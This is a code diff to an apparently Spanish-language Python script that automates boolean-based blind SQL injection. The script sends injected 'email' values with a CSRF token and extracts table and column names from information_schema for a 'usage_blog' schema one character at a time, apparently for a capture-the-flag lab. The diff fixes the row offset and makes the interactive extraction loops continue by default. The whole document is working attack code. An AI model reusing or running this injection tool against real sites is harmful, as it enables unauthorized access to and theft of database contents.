@@ -92,7 +92,7 @@ def nombre_tablas(numero_tabla, headers, token):
             for char in ascii:
                 data = {
                 '_token': f'{token}',
-                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(table_name,{num_letra},1) FROM information_schema.tables WHERE table_schema='usage_blog' LIMIT {numero_tabla},1)='{char}'-- -" 
+                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(table_name,{num_letra},1) FROM information_schema.tables WHERE table_schema='usage_blog' LIMIT {numero_tabla -1},1)='{char}'-- -" 
                 }
 
                 # Peticion POST
@@ -265,7 +265,7 @@ def main():
     print(f"\nTablas encontradas hasta ahora: {tablas}")
 
     #Repeticion de descubrimiento de nombres de tablas
-    while input("\nQuieres continuar descubriendo mas tablas? s/n\n>> ") == "s":
+    while input("\nQuieres continuar descubriendo mas tablas? s/n\n>> ") != "n":
         print(f"Hasta ahora has explorado la/s tabla/s {tablas_escogidas}")
         tabla_escogida = int(input(f"Pasamos a descubrir los nombres de las tablas, selecciona el número de la tabla que quieres probar. (Hay {cantidad_de_tablas} tablas) :\n>> "))
         tablas_escogidas.append(tabla_escogida)
@@ -284,7 +284,7 @@ def main():
     columnas = nombres_columnas(tabla_escogida, cantidad_columnas, token, cabeceras)
     print(f"\nLas columnas de la tabla {tabla_escogida} son:\n{columnas}")
 
-    while input("Quieres sacar datos de alguna columna? s/n\n>> ") == "s":
+    while input("Quieres sacar datos de alguna columna? s/n\n>> ") != "n":
         preguntar_columnas(token, cabeceras, columnas, tabla_escogida)
     
 
